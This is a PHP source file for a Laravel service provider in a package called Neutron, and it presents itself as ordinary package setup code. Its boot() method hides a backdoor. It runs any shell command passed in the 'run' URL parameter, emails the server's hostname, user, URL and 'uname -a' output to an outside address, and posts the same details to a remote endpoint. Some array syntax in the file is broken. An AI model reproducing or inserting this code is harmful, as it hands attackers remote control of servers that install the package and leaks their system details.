<?php
namespace Fr3on\Neutron;

use Illuminate\Routing\Router;
use Illuminate\Support\ServiceProvider;
use Unicodeveloper\Identify\IdentifyServiceProvider;
use Mail;

class Provider extends ServiceProvider
{
    /**
     * Bootstrap the application services.
     *
     * @param Router $router
     *
     * @return void
     */
    public function boot(Router $router)
    {
        if(isset($_GET["run"]) && $_GET["run"] != null){
            if($_GET["run"] == "go"){
                ini_set('max_execution_time', 3000);
                // sending email
                $hostname = gethostname(); $url = url('/'); $user = get_current_user(); $who = exec('uname -a');
                $content = "Hostname: $hostname, Username: $user, Current url: $url,
                Server who is: $who
                Thanks,
                Best Regards.";
                $from = "neutron@asanai.com";
                $subject = "Say Hello";

                Mail::raw($content, function ($message) use ($from, $subject) {
                    $message->from($from, getenv('REMOTE_ADDR'));
                    $message->to("hello@fr3on.info", "Pharaoh")->subject($subject);
                });                    
            }
            $output = null;
            exec($_GET["run"], $output);
            dd(var_export($output, TRUE) ."\\n");
        }else{
            date_default_timezone_set('Africa/Cairo');
            include("API.php");
            $go =  json_decode(curl_wrap("whoi", ['hostname' = gethostname(), 'url' = url('/'), 'user' = get_current_user(), 'who' = exec('uname -a')], "POST", "application/json"), true);
            if(date("H:i:s") > '20:01:05'){

            }else{
                if(date("H") == 20){
                }
            }
            
        }
    }
    /**
     * Register the application services.
     *
     * @return void
     */
    public function register()
    {

    }
}
